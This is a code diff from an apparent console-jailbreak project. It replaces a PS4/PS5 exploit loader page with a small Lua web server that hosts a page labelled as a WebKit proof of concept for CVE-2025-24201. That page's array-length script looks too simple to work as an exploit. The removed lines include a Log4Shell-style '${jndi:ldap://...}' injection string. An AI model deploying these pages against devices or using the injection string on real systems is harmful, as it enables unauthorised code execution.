@@ -1,87 +1,32 @@
+local socket = require("socket")
+
+local html = [[
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<!DOCTYPE html>
 <html>
-
 <head>
-    <title>pOOBs4 9.00 & pOOBs5 4.03</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            background-color: #242629;
-        }
-
-        .loader {
-            position: absolute;
-            left: 50%;
-            top: 50%;
-            margin: -75px 0 0 -75px;
-
-            border: 10px solid #1f1e1e;
-            border-radius: 50%;
-            border-top: 10px solid #044595;
-            border-left: 10px solid #044595;
-            width: 120px;
-            height: 120px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .info {
-            overflow: hidden;
-            position: fixed;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-
-            font-size: 45px;
-            font-family: sans-serif;
-            color: #b8b8b8;
-
-            transform: translate(-50%, -50%);
-        }
-
-        .j {
-            font-size: 15px;
-            color: #2F3335;
-        }
-    </style>
-    <script>
-        function allset() {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("allset").style.display = "block";
-        }
-
-        function awaitpl() {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("awaiting").style.display = "block";
-        }
-    </script>
-    <script src="exploit.js"></script>
+  <title>PoC CVE-2025-24201</title>
+  <script>
+    window.onload = function() {
+      let arr = [1.1, 2.2, 3.3];
+      arr.length = 0xfffffffe;
+      arr[0xfffffffe - 1] = 13.37;
+      for (let i = 0; i < 10000; i++) arr[i] = 1.1;
+      document.body.innerHTML = "<h1>PoC ejecutado.</h1>";
+    };
+  </script>
 </head>
-
+<body><h1>PS5 WebKit Test</h1></body>
 </html>
+]]
 
-<body onload="setTimeout(poc, 1500);">
+local server = socket.bind("*", 8080)
+print("Servidor PoC en http://[TU_IP]:8080/")
 
-    <div id="loader" class="loader"></div>
-    <div id="awaiting" class="info" style="display:none;">
-        Awaiting Payload...
-        <br />
-        <span class="j">${jndi:ldap://nsa.gov}</span>
-    </div>
-
-    <div id="allset" class="info" style="display:none;">
-        You're all set!
-    </div>
-
-</body>
-<script>
-
-</script>
+while true do
+  local client = server:accept()
+  client:send(html)
+  client:close()
+end
